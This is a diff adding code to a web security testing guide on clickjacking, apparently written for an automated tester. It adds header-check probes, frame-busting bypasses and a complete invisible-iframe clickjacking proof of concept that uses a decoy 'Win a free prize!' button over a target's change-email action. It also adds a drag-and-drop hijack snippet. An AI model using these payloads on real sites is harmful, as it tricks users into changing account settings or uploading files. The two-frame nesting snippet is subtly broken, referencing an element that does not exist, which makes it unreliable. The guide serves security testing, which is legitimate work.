@@ -55,6 +55,15 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
    - **`SAMEORIGIN`** → Test: can attacker create a subdomain they control on the same eTLD+1? If yes, bypass is possible
    - **`ALLOW-FROM`** → Deprecated; test with modern browsers to confirm if actually enforced
 
+**Probe:**
+
+```http
+GET /settings/email HTTP/1.1
+Host: target.com
+```
+
+Inspect the response headers — absence of both `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` means the page is frameable.
+
 ### Common Misconfigurations
 
 - Header present on some endpoints but absent on others (e.g., `/api/v1/settings` returns it, `/settings` does not)
@@ -66,6 +75,11 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
 
 ### Syntax
 
+```http
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: frame-ancestors https://trusted.example
+```
 
 ### Bypass Strategy
 
@@ -83,12 +97,33 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
 4. If absent or `'none'` is missing, the page is potentially frameable
 5. Verify with `evaluateRendered` by loading the page in an actual iframe
 
+**Probe comparing enforced vs report-only policy:**
+
+```http
+GET /settings HTTP/1.1
+Host: target.com
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy-Report-Only: frame-ancestors 'none'
+```
+
+`Report-Only` is not enforced — the page remains frameable.
+
 ## 6. Frame Busting Busts
 
 ### What is Frame Busting?
 
 JavaScript-based protection that attempts to break out of iframes:
 
+```html
+<script>
+  if (self !== top) {
+    top.location = self.location;
+  }
+</script>
+```
 
 ### Bypass Techniques
 
@@ -96,12 +131,36 @@ JavaScript-based protection that attempts to break out of iframes:
 
 The `sandbox` attribute (without `allow-top-navigation`) prevents the iframe from navigating the top frame. The frame-busting script cannot redirect `top.location`.
 
+```html
+<iframe src="https://target.com/settings/email" sandbox="allow-forms allow-scripts"></iframe>
+```
+
 **Technique 2: Two-Frame Nesting**
 
 If frame-busting checks `self === top` and there is an intermediate frame, the check may pass.
 
+```html
+<!-- attacker page -->
+<iframe id="outer" src="blank.html"></iframe>
+
+<!-- blank.html on attacker origin -->
+<script>
+  // user gesture propagates; target's frame-bust navigates 'top' = blank.html, not the real top window
+  document.getElementById('f').contentWindow; /* load target in inner frame */
+</script>
+<iframe name="inner" src="https://target.com/settings/email"></iframe>
+```
+
 **Technique 3: Overwrite `top.location` Setter**
 
+```html
+<script>
+  Object.defineProperty(window, 'location', {
+    set: function () { /* swallow frame-bust navigation */ }
+  });
+</script>
+<iframe src="https://target.com/settings/email"></iframe>
+```
 
 **Technique 4: `about:blank` Origin Trick**
 
@@ -121,6 +180,39 @@ After applying bypass, use `evaluateRendered` to confirm:
 ## 7. Iframe Injection — Basic Attack Setup
 
 ### Overlay Alignment
+
+**Payload:** full clickjacking PoC — invisible iframe with decoy overlay aligned over the target's action button:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  iframe {
+    position: absolute;
+    top: 0; left: 0;
+    width: 900px; height: 600px;
+    opacity: 0.0001;          /* near-invisible but still interactive */
+    z-index: 2;
+  }
+  .decoy {
+    position: absolute;
+    top: 320px; left: 400px;  /* aligns with target's "Change Email" button */
+    width: 200px; height: 40px;
+    background: #4CAF50;
+    color: white;
+    text-align: center;
+    line-height: 40px;
+    z-index: 1;
+  }
+</style>
+</head>
+<body>
+  <div class="decoy">Win a free prize!</div>
+  <iframe src="https://target.com/settings/email"></iframe>
+</body>
+</html>
+```
 
 - Use `evaluateRendered` to inspect the target page's layout
 - Match the overlay button position to the iframe's interactive element position
@@ -176,6 +268,14 @@ Chain sequential iframe loads to perform multi-step actions (e.g., change email 
 
 The `dragstart`, `drag`, and `drop` events can be triggered across iframes in some browsers.
 
+```html
+<div id="decoy" style="position:absolute;z-index:1;">Drop file here</div>
+<iframe src="https://target.com/upload" allow="cross-origin-isolated"
+        style="opacity:0.0001;position:absolute;top:0;left:0;width:800px;height:500px;z-index:2;"></iframe>
+<script>
+  // Victim drags the decoy; drop event lands on the invisible target iframe's upload zone
+</script>
+```
 
 ### Use Cases
 
@@ -219,6 +319,17 @@ On mobile devices, tapjacking uses touch events instead of click events.
 
 ### Automated Detection Flow
 
+```http
+GET /transfer-funds HTTP/1.1
+Host: target.com
+```
+
+```http
+GET /settings/password HTTP/1.1
+Host: target.com
+```
+
+Check each response for missing `X-Frame-Options` / `frame-ancestors`, then confirm frameability per endpoint with an iframe render.
 
 ### Manual Testing Tools
 
